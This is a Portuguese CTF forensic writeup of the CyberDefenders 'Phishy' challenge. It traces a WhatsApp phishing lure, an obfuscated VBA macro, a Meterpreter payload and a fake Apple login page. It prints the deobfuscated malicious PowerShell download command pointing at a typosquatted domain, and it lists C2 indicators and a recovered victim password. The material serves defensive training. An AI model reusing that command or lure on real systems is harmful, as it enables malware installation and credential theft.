# 🔍 Phishy — CTF Writeup
### CyberDefenders Blue Team Challenge | Forense Digital · Phishing via WhatsApp · Macro VBA · Meterpreter

---

| **Analista**          | Mauricio Robert                                                                          |
|-----------------------|------------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                        |
| **Data do Relatório** | 24/06/2026                                                                               |
| **Data do Incidente** | 19/03/2021 a 30/04/2021                                                                  |
| **Classificação**     | CONFIDENCIAL                                                                             |
| **Ferramentas**       | Autopsy 4.23.1 · VirusTotal · CyberChef · oledump.py · PasswordFox (NirSoft)           |
| **Arquivo**           | Imagem lógica — `Phishy` (LogicalFileSet1)                                              |

---

## 🔍 Resumo Executivo

A análise forense digital da imagem lógica do desafio **Phishy** (CyberDefenders) reconstruiu um ataque de phishing em múltiplos estágios contra a vítima (`WIN-NF3IQEU4G0T`, Windows 7 Home Basic SP1). O vetor inicial foi uma mensagem **WhatsApp** enviada pelo número `+21698231645`, na qual o atacante, fingindo tratar-se de uma promoção da Apple, induziu a usuária `Semah` a baixar o documento `IPhone-Winners.doc`. O arquivo continha **macros VBA altamente ofuscadas** por concatenação `Chr()` que, ao serem abertas, executavam um comando **PowerShell** via `WScript.Shell` para baixar o payload `IPhone.exe` a partir de um domínio com **typosquatting** (`appIe.com`). Esse arquivo foi identificado como um agente **Meterpreter** do framework **Metasploit** (65/70 detecções no VirusTotal) com *callback* para o C2 do atacante em `155.94.69.27`. Em paralelo, a vítima foi direcionada a uma página de login falsa (`apple.competitions.com/login.php`) que coletou suas credenciais — recuperadas via **PasswordFox** do cofre de senhas do Firefox. A investigação respondeu a **onze questões técnicas**.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta               | Finalidade                                                                                                                        |
|--------------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| **Autopsy 4.23.1**       | Análise da imagem lógica — artefatos do SO, histórico de browser, mensagens WhatsApp, credenciais salvas e navegação de arquivos  |
| **VirusTotal**           | Análise estática e comportamental de `IPhone-Winners.doc` e `IPhone.exe` — detecção de macros, família de malware e IPs de C2    |
| **CyberChef**            | Desofuscação do payload VBA — extração de valores decimais via regex `\d+` e decodificação do comando PowerShell (From Decimal)  |
| **oledump.py**           | Listagem e extração de streams OLE do documento Word malicioso para identificação das macros VBA (streams marcados com 'M')       |
| **PasswordFox (NirSoft)**| Extração de credenciais salvas no Firefox — recuperação da senha submetida na página de login do phishing a partir de `logins.json` |

---

## 📋 Perguntas e Respostas

### Q1 — Qual é o hostname da máquina vítima?

> **Resposta: `WIN-NF3IQEU4G0T`**

**Solução:** Navegando até **Data Artifacts → Operating System Information** no Autopsy, o único registro exibido contém os campos:

```
Name:                  WIN-NF3IQEU4G0T
Program Name:          Windows 7 Home Basic Service Pack 1
Processor Architecture: AMD64
Temporary Files Directory: %SystemRoot%\TEMP
Path:                  C:\Windows
Product ID:            00346-339-0000007-85805
Owner:                 Windows User
```

O campo **Name** identificado como `WIN-NF3IQEU4G0T` é o hostname da máquina vítima, confirmado pelo campo **Source** como `Recent Activity`.

---

### Q2 — Qual é o aplicativo de mensagens instalado na máquina vítima?

> **Resposta: `WhatsApp`**

**Solução:** A navegação no Autopsy pela árvore de arquivos revelou o caminho:

```
LogicalFileSet1/Phishy/Users/Semah/AppData/Roaming/WhatsApp/Databases/
```

contendo os bancos de dados `msgstore.db`, `wa.db`, `payments.db`, `stickers.db` e demais arquivos do **WhatsApp**. O **WhatsApp Viewer** integrado ao Autopsy exibiu o histórico de mensagens entre a vítima (`Semah`) e o número `+21698231645`, no qual o atacante enviou o link do documento malicioso disfarçado de uma promoção de iPhone 12 — confirmando o **WhatsApp** como o vetor de entrega do ataque.

---

### Q3 — O atacante induziu a vítima a baixar um documento malicioso. Forneça a URL completa de download.

> **Resposta: `http://apple.com/IPhone-Winners.doc`**

**Solução:** Na conversa do WhatsApp recuperada pelo Autopsy (número `+21698231645 ↔ Semah`, em `19/03/2021`), o fluxo de mensagens documentou a engenharia social: o atacante iniciou com "Hello", perguntou se a vítima estava com ele e afirmou que ela havia se registrado em um sorteio de iPhone 12. Quando a vítima perguntou se havia ganho, o atacante respondeu às `19/03/2021 – 1:43:43 PM`:

```
"We listed the 5 winners in this document 'http://apple.com/IPhone-Winners.doc'"
```

A URL completa de download do documento malicioso é **`http://apple.com/IPhone-Winners.doc`**.

---

### Q4 — Múltiplos streams contêm macros no documento. Forneça o número do stream mais alto.

> **Resposta: `10`**

**Solução:** Com o **oledump.py** aplicado ao arquivo `IPhone-Winners.doc`:

```
C:\Users\ForenseAnalyst\Downloads> python oledump.py IPhone-Winners.doc
  1:       114  '\x01CompObj'
  2:      4096  '\x05DocumentSummaryInformation'
  3:      4096  '\x05SummaryInformation'
  4:      8473  '1Table'
  5:       501  'Macros/PROJECT'
  6:        68  'Macros/PROJECTwm'
  7:      3109  'Macros/VBA/_VBA_PROJECT'
  8:       800  'Macros/VBA/dir'
  9:  M   1170  'Macros/VBA/eviliphone'
 10:  M   5581  'Macros/VBA/iphoneevil'
 11:      4096  'WordDocument'
```

Os streams marcados com **'M'** (Macro) são o stream **9** (`eviliphone`, 1170 bytes) e o stream **10** (`iphoneevil`, 5581 bytes). O maior índice entre os streams com macros é o **stream 10**.

---

### Q5 — A macro executou um programa. Qual é o nome do programa?

> **Resposta: `PowerShell`**

**Solução:** A análise do **VirusTotal** sobre o hash de `IPhone-Winners.doc` (`8d49551eaba3388c69538fde1ec51bb1528f6b029602b049a222bb2588487fc6`, 38/62 detecções) revelou na seção **Code Insights** a descrição da macro `iphoneevil.bas`:

```
A função '1111111111()' é responsável por criar a variável '1111111111' 
concatenando múltiplos códigos de caractere Chr().
A string resultante é um comando PowerShell que parece ser ofuscado.
Quando decodificado, o comando PowerShell é:
    Powershell -encodedCommand ...

A macro usa CreateObject("WScript.Shell") e chama o método Run 
para executar o comando PowerShell construído.
```

O VirusTotal confirma: a macro `iphoneevil.bas` usa `WScript.Shell.Run()` para executar um comando **PowerShell**, com detecções incluindo as famílias `downloader.emodidr/heur2` e `w97m`.

---

### Q6 — A macro baixou um arquivo malicioso. Forneça a URL completa de download.

> **Resposta: `http://appIe.com/IPhone.exe`**

**Solução:** O payload VBA do stream 10 foi desofuscado via **CyberChef** com a receita **Regular Expression (`\d+`) → From Decimal**. O código ofuscado era uma longa concatenação de chamadas `Chr(97) & Chr(66) & Chr(117) & Chr(65) & ...`, resultando no comando PowerShell completo:

```powershell
invoke-webrequest -Uri 'http://appIe.com/IPhone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

A URL de download do payload malicioso é **`http://appIe.com/IPhone.exe`**. Note o **typosquatting**: a letra `l` minúscula em "apple" foi substituída por `I` maiúsculo (`appIe.com`), tornando o domínio visualmente idêntico a `apple.com` na maioria das fontes.

---

### Q7 — Para onde o arquivo malicioso foi baixado? (Forneça o caminho completo)

> **Resposta: `C:\Temp\IPhone.exe`**

**Solução:** O comando PowerShell deofuscado pelo CyberChef especifica explicitamente o parâmetro `-OutFile`:

```powershell
invoke-webrequest -Uri 'http://appIe.com/IPhone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

O parâmetro **`-OutFile 'C:\Temp\IPhone.exe'`** indica que o payload é salvo no diretório `C:\Temp\` da máquina vítima com o nome `IPhone.exe`. O Autopsy confirmou a presença do arquivo nos Downloads da vítima com o hash MD5 correspondente ao arquivo analisado no VirusTotal.

---

### Q8 — Qual é o nome do framework utilizado para criar o malware?

> **Resposta: `Metasploit`**

**Solução:** A análise do arquivo `IPhone.exe` (hash `72c677ba5bf40394361b3566b6bb2b1c0c5e726b10c9af2debf7384385ebdbd1`, 72.07 KB) no **VirusTotal** resultou em **65/70 detecções**. Os principais indicadores foram:

```
Popular threat label:  trojan.swort/meterpreter
Family labels:         swort · meterpreter · cryptz
Detecções relevantes:
    AhnLab-V3:   Trojan/Win32.Shell.R1283
    AliCloud:    Backdoor:Win/meterpreter.A
    Elastic:     Windows.Trojan.Metasploit
    Microsoft:   Backdoor:Win/ConnectBack.A!sp
```

O rótulo **`meterpreter`** e a classificação **`Windows.Trojan.Metasploit`** confirmam que o payload foi gerado pelo framework **Metasploit**, especificamente utilizando o stager **Meterpreter** para estabelecer comunicação reversa com o C2 do atacante.

---

### Q9 — Qual é o endereço IP do atacante?

> **Resposta: `155.94.69.27`**

**Solução:** Na aba **Behavior** do VirusTotal para o `IPhone.exe`, a seção **Network Communication** revelou:

```
DNS Resolutions
    ip-155-94-69-27-static.hsip.as19531.net
    Resolved IPs: 155.94.69.27

Memory Pattern IPs
    155.94.69.27
```

O endereço **`155.94.69.27`** é o servidor **C2 (Command and Control)** do atacante — o IP para o qual o Meterpreter estabelece a sessão reversa após a execução do payload na máquina vítima. O hostname estático `ip-155-94-69-27-static.hsip.as19531.net` identifica o bloco como pertencente ao AS19531.

---

### Q10 — O golpe fake giveaway usou uma página de login para coletar informações. Forneça a URL completa da página de login.

> **Resposta: `http://apple.competitions.com/login.php`**

**Solução:** O histórico de navegação do Firefox da vítima foi extraído do Autopsy em:

```
AppData/Roaming/Mozilla/Firefox/Profiles/pyb51x2n.default-release/places.sqlite
```

A tabela `moz_places` (19 entradas) foi analisada na aba *Application* do Autopsy. A entrada de ID **17** destacada em azul revelou:

```
URL:         http://apple.competitions.com/login.php
rev_host:    moc.elppa
visit_count: 125
```

O alto `visit_count` (125 visitas) e o domínio `apple.competitions.com` — que imita a Apple mas não é domínio oficial — confirmam que esta é a **página de login falsa** utilizada para coletar as credenciais da vítima.

---

### Q11 — Qual é a senha que o usuário submeteu à página de login?

> **Resposta: `GacsriIeUZMY4xdAF4yj`**

**Solução:** Utilizando o **PasswordFox (NirSoft)** sobre o perfil Firefox da vítima (arquivo `logins.json` extraído do Autopsy), as credenciais salvas para `https://apple.com` foram recuperadas:

```
Web Site:             https://apple.com
User Name:            Semah
Password:             GacsriIeUZMY4xdAF4yj
Password Strength:    Very Strong
Firefox Version:      32+
Created Time:         4/30/2021 3:28:24 AM
Last Time Used:       4/30/2021 3:28:24 AM
Password Change Time: 4/30/2021 3:28:24 AM
Password Use Count:   1
```

A senha **`GacsriIeUZMY4xdAF4yj`** foi submetida pela vítima `Semah` na página de login falsa em **30/04/2021 às 03:28**, coincidindo com o período do ataque documentado no histórico de navegação (`apple.competitions.com/login.php`, 125 visitas).

---

## ⛓ Kill Chain — Linha do Tempo do Ataque

```
[19/03/2021 13:41 UTC] FASE 1 — ENGENHARIA SOCIAL (WhatsApp)
    Atacante (+21698231645) inicia contato com vítima Semah via WhatsApp
    Simula sorteio de iPhone 12 ("You registered in Apple competition...")
    Vítima pergunta se ganhou → atacante confirma
    ↓
[19/03/2021 13:43 UTC] FASE 2 — ENTREGA DO DOCUMENTO MALICIOSO
    Atacante envia URL: http://apple.com/IPhone-Winners.doc
    Vítima baixa IPhone-Winners.doc (36.352 bytes)
    MD5: 8d49551eaba3388c...fc6 — 38/62 detecções VT
    ↓
[Ao abrir o .doc] FASE 3 — EXECUÇÃO DAS MACROS VBA
    Stream 9: Macros/VBA/eviliphone (1170 bytes)
    Stream 10: Macros/VBA/iphoneevil (5581 bytes) — payload principal
    Macro constrói string ofuscada por Chr() → comando PowerShell
    CreateObject("WScript.Shell").Run(PowerShell_Command)
    ↓
[Execução do PowerShell] FASE 4 — DOWNLOAD DO PAYLOAD (Typosquatting)
    invoke-webrequest -Uri 'http://appIe.com/IPhone.exe'
                      -OutFile 'C:\Temp\IPhone.exe'
    IPhone.exe: 72.07 KB — Meterpreter/Metasploit
    MD5: 72c677ba5bf40394...bd1 — 65/70 detecções VT
    ↓
[Pós-execução] FASE 5 — SHELL REVERSO (C2)
    IPhone.exe executa → Meterpreter conecta a 155.94.69.27
    Atacante obtém sessão interativa na máquina WIN-NF3IQEU4G0T
    ↓
[30/04/2021 03:28 UTC] FASE 6 — CREDENTIAL HARVESTING
    Vítima acessa http://apple.competitions.com/login.php (125 visitas)
    Submete credenciais: Semah / GacsriIeUZMY4xdAF4yj
    Senha salva no Firefox logins.json → recuperada via PasswordFox
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| Hostname da vítima | Autopsy → Data Artifacts → OS Information | `WIN-NF3IQEU4G0T` |
| App de mensagens | Autopsy → `/Users/Semah/AppData/Roaming/WhatsApp/Databases/` | `WhatsApp` (msgstore.db, wa.db) |
| URL do documento malicioso | Autopsy → WhatsApp Viewer (mensagem 19/03/2021 13:43) | `http://apple.com/IPhone-Winners.doc` |
| Stream de macro mais alto | oledump.py → `IPhone-Winners.doc` | Stream `10` (`Macros/VBA/iphoneevil`, 5581 bytes) |
| Programa executado pela macro | VirusTotal → Code Insights (`iphoneevil.bas`) | `PowerShell` via `WScript.Shell.Run()` |
| URL do payload | CyberChef (regex `\d+` + From Decimal) | `http://appIe.com/IPhone.exe` (typosquatting) |
| Caminho do payload | CyberChef → parâmetro `-OutFile` do PowerShell | `C:\Temp\IPhone.exe` |
| Framework do malware | VirusTotal → `IPhone.exe` (65/70, Meterpreter label) | `Metasploit` |
| IP do atacante (C2) | VirusTotal Behavior → Memory Pattern IPs | `155.94.69.27` |
| URL da página de login | Autopsy → Firefox `places.sqlite` (ID 17, 125 visitas) | `http://apple.competitions.com/login.php` |
| Senha submetida | PasswordFox → Firefox `logins.json` | `GacsriIeUZMY4xdAF4yj` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Hostname da vítima | `WIN-NF3IQEU4G0T` | Windows 7 Home Basic SP1, AMD64 |
| Usuária comprometida | `Semah` | Conta local na máquina vítima |
| Vetor de entrega | WhatsApp — `+21698231645` | Número do atacante; conta usada no phishing inicial |
| Documento malicioso | `IPhone-Winners.doc` (36.352 bytes) | Hash: `8d49551eaba3388c...fc6` — 38/62 VT |
| URL phishing inicial | `http://apple.com/IPhone-Winners.doc` | Link enviado via WhatsApp |
| Macro VBA | Stream 10 — `Macros/VBA/iphoneevil` (5581 bytes) | Payload principal ofuscado por `Chr()` |
| Programa executado | `PowerShell` | Via `CreateObject("WScript.Shell").Run()` |
| URL do payload | `http://appIe.com/IPhone.exe` | Typosquatting — `I` maiúsculo por `l` |
| Payload | `IPhone.exe` (72.07 KB) | Hash: `72c677ba5bf40394...bd1` — 65/70 VT |
| Caminho do payload | `C:\Temp\IPhone.exe` | Salvo via PowerShell `-OutFile` |
| Framework | Metasploit (Meterpreter) | Labels: swort, meterpreter, cryptz |
| IP C2 | `155.94.69.27` | Servidor Meterpreter — AS19531 |
| Hostname C2 | `ip-155-94-69-27-static.hsip.as19531.net` | Resolvido pelo payload em sandbox VT |
| URL phishing (login) | `http://apple.competitions.com/login.php` | 125 visitas — `places.sqlite` ID 17 |
| Credencial comprometida | `Semah / GacsriIeUZMY4xdAF4yj` | Recuperada via PasswordFox do Firefox |
| Técnica (MITRE ATT&CK) | `T1566.002` | Phishing: Spearphishing Link |
| Técnica (MITRE ATT&CK) | `T1059.001` | Command and Scripting Interpreter: PowerShell |
| Técnica (MITRE ATT&CK) | `T1105` | Ingress Tool Transfer |
| Técnica (MITRE ATT&CK) | `T1071.001` | Application Layer Protocol: Web Protocols (C2) |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | Hostname da máquina vítima | `WIN-NF3IQEU4G0T` |
| Q2 | Aplicativo de mensagens | `WhatsApp` |
| Q3 | URL de download do documento malicioso | `http://apple.com/IPhone-Winners.doc` |
| Q4 | Número do stream de macro mais alto | `10` |
| Q5 | Programa executado pela macro | `PowerShell` |
| Q6 | URL de download do arquivo malicioso | `http://appIe.com/IPhone.exe` |
| Q7 | Caminho completo do arquivo baixado | `C:\Temp\IPhone.exe` |
| Q8 | Framework utilizado para criar o malware | `Metasploit` |
| Q9 | IP do atacante (C2) | `155.94.69.27` |
| Q10 | URL da página de login do phishing | `http://apple.competitions.com/login.php` |
| Q11 | Senha submetida pelo usuário | `GacsriIeUZMY4xdAF4yj` |

---

## 🛡 Recomendações

- **Bloquear os IoCs** — domínios `appIe.com`, `apple.competitions.com` e IP `155.94.69.27` no firewall perimetral e no DNS
- **Desativar macros automaticamente** via Group Policy (GPO) para documentos baixados da internet (`Block macros from running in Office files from the internet`)
- **Isolar a máquina `WIN-NF3IQEU4G0T`** e realizar análise dinâmica completa, seguida de reimagem — o Meterpreter pode ter estabelecido persistência
- **Implementar regras IDS/IPS** para detecção de tráfego Meterpreter (Snort/Suricata — rule TAG_LOG_PKT identificada pelo VT Behavior)
- **Revogar e redefinir** as credenciais da conta Apple de `Semah` (`GacsriIeUZMY4xdAF4yj`) e habilitar 2FA imediatamente
- **Reportar o número `+21698231645`** ao WhatsApp (abuse@whatsapp.com) para bloqueio da conta do atacante
- **Treinar usuários** sobre phishing via WhatsApp — kits que imitam marcas conhecidas (Apple, sorteios) são vetores crescentes de comprometimento

---

## 📚 Referências

- [CyberDefenders — Phishy CTF](https://cyberdefenders.org/blueteam-ctf-challenges/phishy/)
- [Autopsy Digital Forensics Platform](https://www.autopsy.com/)
- [VirusTotal](https://www.virustotal.com/)
- [CyberChef (GCHQ)](https://gchq.github.io/CyberChef/)
- [oledump.py — Didier Stevens](https://blog.didierstevens.com/programs/oledump-py/)
- [PasswordFox — NirSoft](https://www.nirsoft.net/utils/passwordfox.html)
- [Metasploit Framework](https://www.metasploit.com/)
- [MITRE ATT&CK T1566.002 — Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
- [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)

---

*Writeup elaborado por Mauricio Robert — Faculdade Impacta | Junho 2026*
